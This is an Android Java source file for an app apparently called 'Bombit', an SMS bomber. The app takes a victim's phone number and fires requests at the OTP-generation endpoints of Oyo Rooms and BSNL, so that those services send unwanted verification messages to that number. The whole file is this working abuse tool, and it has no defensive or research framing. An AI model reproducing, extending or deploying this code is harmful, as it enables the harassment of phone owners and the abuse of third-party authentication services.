package in.cocomo.bombit;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        final String TAG = "Bombit";

        Button bombIt = findViewById(R.id.btn_bombit);
        final EditText ed_phoneNo = findViewById(R.id.et_phoneNo);

        final Callback cb = new Callback() {
            @Override
            public void onFailure(@NotNull Call call, @NotNull IOException e) {
                Log.d(TAG,"Made a Failed request");
            }
            @Override
            public void onResponse(@NotNull Call call, @NotNull Response response) {
                if(response.isSuccessful()) {
                    Log.d(TAG,"Successful request made");
                }
            }
        };

        bombIt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String phoneNo = ed_phoneNo.getText().toString();
                OyoRooms(phoneNo,cb);
                BSNL(phoneNo,cb);
            }
        });

    }

    public void OyoRooms(String phoneNo, Callback cb) {
        OkHttpClient okHttpClient = new OkHttpClient();

        String url="https://www.oyorooms.com/api/pwa/generateotp?phone=" + phoneNo;

        okHttpClient.newCall(new Request.Builder().url(url)
                .get()
                .build())
                .enqueue(cb);
    }

    public void BSNL(String phoneNo,Callback cb) {
        OkHttpClient okHttpClient = new OkHttpClient();

        String url="https://portal2.bsnl.in/myportal/validatemobile.do";
        String referer_url = "https://portal2.bsnl.in/myportal/authorize.do";

        MediaType parse = MediaType.parse("application/x-www-form-urlencoded");

        okHttpClient.newCall(new Request.Builder().url(url)
                .post(RequestBody.create(parse,"mobile=" + phoneNo))
                .addHeader("Referer", referer_url)
                .build())
                .enqueue(cb);
    }
}
